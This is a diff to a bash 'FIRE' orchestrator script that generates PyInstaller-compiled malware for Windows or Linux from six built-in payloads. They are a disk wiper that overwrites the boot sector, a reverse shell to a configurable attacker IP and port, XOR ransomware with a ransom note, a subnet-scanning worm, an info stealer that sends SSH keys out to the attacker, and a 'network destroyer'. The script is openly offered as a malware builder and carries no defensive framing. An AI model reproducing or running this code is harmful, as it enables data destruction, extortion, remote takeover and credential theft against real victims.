@@ -1,57 +1,80 @@
-cat > FIRE << 'EOF'
 #!/bin/bash
 
-# --- AESTHETICS ---
 R='\033[1;31m'
 G='\033[1;32m'
 Y='\033[1;33m'
 B='\033[1;34m'
 NC='\033[0m'
-clear
-cat << "EOF"
+
+DEFAULT_ATTACKER_IP="127.0.0.1" # <-- CHANGE THIS TO YOUR ATTACKER IP
+DEFAULT_ATTACKER_PORT="4444"     # <-- CHANGE THIS TO YOUR LISTENER PORT
+VENV_DIR="./fire_venv"
+WORK_DIR="./fire_build"
+FINAL_NAME_WIN="pc.exe"
+FINAL_NAME_LIN="pc"
+
+display_banner() {
+    clear
+    cat << "EOF"
   __      __  _    _  _        _____            _   _
   \ \    / / | |  | || |      / ____|    /\    | \ | |
    \ \  / /  | |  | || |     | |        /  \   |  \| |
     \ \/ /   | |  | || |     | |       / /\ \  | . ` |
      \  /    | |__| || |____ | |____  / ____ \ | |\  |
       \/      \____/ |______| \_____|/_/    \_\|_| \_|
-       [ FIRE // Orchestrator v5 - Self-Contained ]
+       [ FIRE // Orchestrator v7-Lite - Win/Linux Only ]
 EOF
+}
 
+check_dependencies() {
+    if ! command -v python3 &> /dev/null; then
+        echo -e "${R}[!] Python3 is not installed. Please install it first.${NC}"
+        exit 1
+    fi
+    
+    if ! command -v pip &> /dev/null; then
+        echo -e "${R}[!] pip is not installed. Please install it first.${NC}"
+        exit 1
+    fi
+}
 
-ATTACKER_IP="YOUR_IP_ADDRESS" # <-- CHANGE THIS
-ATTACKER_PORT="4444"
+setup_environment() {
+    if [ ! -d "$VENV_DIR" ]; then
+        echo -e "${Y}[*] Creating isolated Python environment...${NC}"
+        python3 -m venv "$VENV_DIR"
+    fi
 
+    source "$VENV_DIR/bin/activate"
 
-VENV_DIR="./fire_venv"
+    if ! python3 -c "import PyInstaller" &> /dev/null; then
+        echo -e "${Y}[*] PyInstaller not found in venv. Installing...${NC}"
+        pip install pyinstaller > /dev/null 2>&1
+    fi
 
-if [ ! -d "$VENV_DIR" ]; then
-    echo -e "${Y}[*] Creating isolated Python environment...${NC}"
-    python3 -m venv "$VENV_DIR"
-fi
+    mkdir -p "$WORK_DIR"
+    cd "$WORK_DIR"
+}
 
-
-source "$VENV_DIR/bin/activate"
-
-if ! python3 -c "import PyInstaller" &> /dev/null; then
-    echo -e "${Y}[*] PyInstaller not found in venv. Installing...${NC}"
-    pip install pyinstaller > /dev/null 2>&1
-fi
-
-WORK_DIR="./fire_build"
-mkdir -p "$WORK_DIR"
-cd "$WORK_DIR"
+cleanup() {
+    cd ..
+    rm -rf "$WORK_DIR"
+    deactivate
+}
 
 generate_payload() {
     local type=$1
-    local final_name="pc.exe"
-    echo -e "${Y}[*] Generating Python payload for type: $type${NC}"
+    local attacker_ip=$2
+    local attacker_port=$3
+    local target_os=$4
+    local final_name=$5
+    
+    echo -e "${Y}[*] Generating Python payload for type: $type | Target OS: $target_os${NC}"
 
     case $type in
-        1) 
+        1)
             cat > "payload.py" << EOP
 import os, sys
-if sys.platform == "win32":
+if sys.platform.startswith("win"):
     with open(r"\\.\PhysicalDrive0", "r+b") as f:
         f.seek(0)
         f.write(b'\x00' * 512)
@@ -61,17 +84,19 @@ else:
     os.system("reboot")
 EOP
             ;;
-        2) # BACKDOOR
+        2)
             cat > "payload.py" << EOP
 import os, sys, socket, subprocess, time
-if sys.platform == "win32":
-    CMD = f"powershell -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$ATTACKER_PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String);\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()\""
+ATTACKER_IP = '$attacker_ip'
+ATTACKER_PORT = $attacker_port
+if sys.platform.startswith("win"):
+    CMD = f"powershell -Command \"\$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{ATTACKER_PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String);\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()\""
     os.system(CMD)
 else:
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(('$ATTACKER_IP', $ATTACKER_PORT))
+            s.connect((ATTACKER_IP, ATTACKER_PORT))
             os.dup2(s.fileno(), 0)
             os.dup2(s.fileno(), 1)
             os.dup2(s.fileno(), 2)
@@ -80,9 +105,9 @@ else:
             time.sleep(10)
 EOP
             ;;
-        3) # RANSOMWARE
+        3)
             cat > "payload.py" << EOP
-import os, base64, random, socket
+import os, base64, random
 from pathlib import Path
 def xor_encrypt(data, key):
     return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
@@ -99,11 +124,11 @@ for root, _, files in os.walk(target_dir):
                 with open(str(file_path) + ext, 'wb') as f: f.write(encrypted_data)
                 os.remove(file_path)
             except: pass
-with open(target_dir / 'READ_ME_FIRE.txt', 'w') as f:
+with open(target_dir / 'README_FIRE.txt', 'w') as f:
     f.write(f"Your files are encrypted. Key: {base64.b64encode(key).decode()}")
 EOP
             ;;
-        4) # WORM
+        4)
             cat > "payload.py" << EOP
 import os, socket, subprocess, time
 def get_subnet():
@@ -119,14 +144,15 @@ for i in range(1, 255):
         print(f"[+] Found host: {ip}", flush=True)
 EOP
             ;;
-        5) # INFO STEALER
+        5)
             cat > "payload.py" << EOP
 import os, glob, json, socket, base64
 from pathlib import Path
+ATTACKER_IP = '$attacker_ip'
 def exfiltrate(data):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('$ATTACKER_IP', 8080))
+        s.connect((ATTACKER_IP, 8080))
         s.sendall(data)
         s.close()
     except: pass
@@ -138,7 +164,7 @@ for file in glob.glob(str(Path.home() / ".ssh/id_rsa")):
 exfiltrate(json.dumps(data_bundle).encode())
 EOP
             ;;
-        6) # NETWORK DESTROYER
+        6)
             cat > "payload.py" << EOP
 import os, socket, subprocess, sys, time
 def get_subnet():
@@ -154,27 +180,63 @@ for i in range(1, 255):
         print(f"[!] Targeting: {ip}", flush=True)
 EOP
             ;;
+        *)
+            echo -e "${R}[!] Invalid payload type selected.${NC}"
+            return 1
+            ;;
     esac
-
     
-    echo -e "${Y}[*] Compiling to a standalone executable...${NC}"
+    echo -e "${Y}[*] Compiling to a standalone executable for $target_os...${NC}"
     
-    pyinstaller --onefile --noconsole --name="$final_name" payload.py
+    local pyinstaller_args="--onefile --name=$final_name"
+    if [ "$target_os" == "Windows" ]; then
+        pyinstaller_args="$pyinstaller_args --noconsole"
+    fi
+    pyinstaller $pyinstaller_args payload.py
 
     if [ -f "dist/$final_name" ]; then
         echo -e "${G}[+] Success! Malware created as 'dist/$final_name'.${NC}"
         mv "dist/$final_name" ..
+        return 0
     else
-        echo -e "${R}[!] Failed to create .exe. Check for errors above.${NC}"
+        echo -e "${R}[!] Failed to create executable. Check for errors above.${NC}"
+        return 1
     fi
-    
-    cd ..
-   
-    rm -rf "$WORK_DIR"
 }
 
+display_banner
+check_dependencies
 
-echo -e "${B}SELECT PAYLOAD TYPE:${NC}"
+echo -e "${B}CONFIGURATION:${NC}"
+read -p "Enter attacker IP address [default: $DEFAULT_ATTACKER_IP]: " ATTACKER_IP
+ATTACKER_IP=${ATTACKER_IP:-$DEFAULT_ATTACKER_IP}
+
+read -p "Enter attacker port [default: $DEFAULT_ATTACKER_PORT]: " ATTACKER_PORT
+ATTACKER_PORT=${ATTACKER_PORT:-$DEFAULT_ATTACKER_PORT}
+
+echo -e "\n${B}SELECT TARGET OPERATING SYSTEM:${NC}"
+echo "1) Windows"
+echo "2) Linux"
+read -p ">> " os_choice
+
+case $os_choice in
+    1)
+        TARGET_OS="Windows"
+        FINAL_NAME="$FINAL_NAME_WIN"
+        ;;
+    2)
+        TARGET_OS="Linux"
+        FINAL_NAME="$FINAL_NAME_LIN"
+        ;;
+    *)
+        echo -e "${R}[!] Invalid OS choice. Exiting.${NC}"
+        exit 1
+        ;;
+esac
+
+setup_environment
+
+echo -e "\n${B}SELECT PAYLOAD TYPE:${NC}"
 echo "1) Bricker (Disk Destroyer)"
 echo "2) Backdoor (Reverse Shell)"
 echo "3) Ransomware (File Encryptor)"
@@ -184,10 +246,11 @@ echo "6) Network Destroyer (Conceptual)"
 read -p ">> " payload_choice
 
 echo -e "\n${R}--- GENERATING PAYLOAD ---${NC}"
-generate_payload "$payload_choice"
 
+if generate_payload "$payload_choice" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
+    echo -e "${G}>> OPERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
+else
+    echo -e "${R}>> OPERATION FAILED.${NC}"
+fi
 
-deactivate
-
-echo -e "${G}>> OPERATION COMPLETE. Check the parent directory for 'pc.exe'.${NC}"
-EOF
+cleanup
